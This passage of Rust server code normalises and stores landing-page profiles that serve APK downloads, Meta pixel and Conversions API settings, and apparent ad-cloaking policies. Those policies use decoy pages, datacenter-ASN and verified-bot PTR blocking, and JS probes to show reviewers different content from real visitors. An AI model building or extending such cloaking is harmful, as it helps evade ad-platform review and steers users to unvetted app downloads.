        "SELECT EXISTS(SELECT 1 FROM route_landing_configs WHERE landing_profile_id = $1)",
    )
    .bind(id)
    .fetch_one(pool)
    .await?;
    Ok(used)
}

async fn sync_bound_meta_routes(
    tx: &mut sqlx::Transaction<'_, sqlx::Postgres>,
    profile_id: Uuid,
    keep_existing_token: bool,
) -> anyhow::Result<()> {
    if keep_existing_token {
        sqlx::query(
            r#"
            UPDATE route_meta_configs m
            SET enabled = p.enabled,
                pixel_id = p.pixel_id,
                test_event_code = p.test_event_code,
                currency = p.currency,
                value = p.value,
                page_view_enabled = p.page_view_enabled,
                view_content_enabled = p.view_content_enabled,
                lead_enabled = p.lead_enabled
            FROM meta_profiles p
            WHERE m.meta_profile_id = p.id
              AND p.id = $1
            "#,
        )
        .bind(profile_id)
        .execute(&mut **tx)
        .await?;
    } else {
        sqlx::query(
            r#"
            UPDATE route_meta_configs m
            SET enabled = p.enabled,
                pixel_id = p.pixel_id,
                capi_token = p.capi_token,
                test_event_code = p.test_event_code,
                currency = p.currency,
                value = p.value,
                page_view_enabled = p.page_view_enabled,
                view_content_enabled = p.view_content_enabled,
                lead_enabled = p.lead_enabled
            FROM meta_profiles p
            WHERE m.meta_profile_id = p.id
              AND p.id = $1
            "#,
        )
        .bind(profile_id)
        .execute(&mut **tx)
        .await?;
    }
    Ok(())
}

fn normalize_landing_profile(
    input: SaveLandingProfileInput,
) -> anyhow::Result<SaveLandingProfileInput> {
    let name = input.name.trim();
    if name.is_empty() {
        anyhow::bail!("落地页名称不能为空");
    }
    let landing_mode = if input.landing_mode == "template" {
        "template".to_string()
    } else {
        "default".to_string()
    };
    let (template_id, image_asset_id) = if landing_mode == "template" {
        if input.template_id.is_none() {
            anyhow::bail!("自定义模板落地页必须选择模板或上传 ZIP");
        }
        (input.template_id, None)
    } else {
        (None, input.image_asset_id)
    };
    Ok(SaveLandingProfileInput {
        name: name.to_string(),
        landing_mode,
        template_id,
        image_asset_id,
        title: default_text(input.title.trim(), "下载"),
        apk_url: input.apk_url.trim().to_string(),
        auto_download: input.auto_download,
        enabled: input.enabled,
    })
}

fn normalize_cloak_policy(input: SaveCloakPolicyInput) -> anyhow::Result<SaveCloakPolicyInput> {
    let name = input.name.trim();
    if name.is_empty() {
        anyhow::bail!("分流策略名称不能为空");
    }
    Ok(SaveCloakPolicyInput {
        name: name.to_string(),
        enabled: input.enabled,
        threshold: input.threshold.clamp(1, 100),
        token_hours: input.token_hours.clamp(1, 24 * 30),
        decoy_title: default_text(input.decoy_title.trim(), "下载"),
        decoy_image_asset_id: input.decoy_image_asset_id,
        decoy_apk_url: input.decoy_apk_url.trim().to_string(),
        use_ip_blacklist: input.use_ip_blacklist,
        use_header_rules: input.use_header_rules,
        require_sec_fetch_mode: input.require_sec_fetch_mode,
        use_js_probe: input.use_js_probe,
        use_asn: input.use_asn,
        use_ptr: input.use_ptr,
        block_datacenter_asn: input.block_datacenter_asn,
        block_datacenter_ptr: input.block_datacenter_ptr,
        block_verified_bot_ptr: input.block_verified_bot_ptr,
        ptr_timeout_ms: input.ptr_timeout_ms.clamp(100, 5_000),
        ptr_cache_hours: input.ptr_cache_hours.clamp(1, 24 * 30),
    })
}

fn normalize_meta_profile(input: SaveMetaProfileInput) -> anyhow::Result<SaveMetaProfileInput> {
    let name = input.name.trim();
    if name.is_empty() {
        anyhow::bail!("Meta 配置名称不能为空");
    }
    let currency = default_text(input.currency.trim(), "USD").to_uppercase();
    Ok(SaveMetaProfileInput {
        name: name.to_string(),
        enabled: input.enabled,
        pixel_id: input.pixel_id.trim().to_string(),
        capi_token: input.capi_token.trim().to_string(),
        test_event_code: input.test_event_code.trim().to_string(),
        currency,
        value: input.value,
        page_view_enabled: input.page_view_enabled,
        view_content_enabled: input.view_content_enabled,
        lead_enabled: input.lead_enabled,
    })
}

fn clean_role(value: &str) -> String {
    if value.trim() == "exit" {
        "exit".to_string()
    } else {
        "entry".to_string()
    }
}

fn clean_domain(value: &str) -> String {
    value
        .trim()
        .trim_start_matches("https://")
        .trim_start_matches("http://")
        .split('/')
        .next()
        .unwrap_or("")
        .split(':')
        .next()
        .unwrap_or("")
        .trim()
        .to_lowercase()
}

fn default_text(value: &str, fallback: &str) -> String {
    if value.is_empty() {
        fallback.to_string()
    } else {
        value.to_string()
    }
}
